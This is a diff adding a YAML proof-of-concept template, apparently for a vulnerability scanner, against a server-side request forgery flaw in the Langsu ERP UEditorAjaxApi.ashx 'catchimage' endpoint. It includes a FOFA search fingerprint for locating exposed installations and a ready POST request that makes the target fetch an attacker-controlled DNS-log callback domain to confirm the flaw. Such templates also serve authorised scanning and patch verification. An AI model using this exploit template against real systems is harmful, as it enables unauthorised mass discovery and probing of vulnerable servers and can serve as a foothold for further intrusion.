@@ -1,0 +1,20 @@
+id: poc-yaml-lserp-ueditorajaxapi-ashx-ssrf
+info:
+  name: 朗速ERP UEditorAjaxApi.ashx SSRF漏洞
+  severity: high
+  tags:
+  - DNSLOG
+  - ssrf
+  finger: 朗速ERP
+  fofa: body="/Resource/Scripts/Yw/Yw_Bootstrap.js"
+variables:
+  reverse: new_dns_log()
+  domain: reverse.Domain()
+requests:
+- method: POST
+  path: /Api/UEditor/UEditorAjaxApi.ashx?method=catchimage
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=utf-8
+  data: source[]=http://{{.domain}}
+  expression: reverse.Verify()
+transport: http
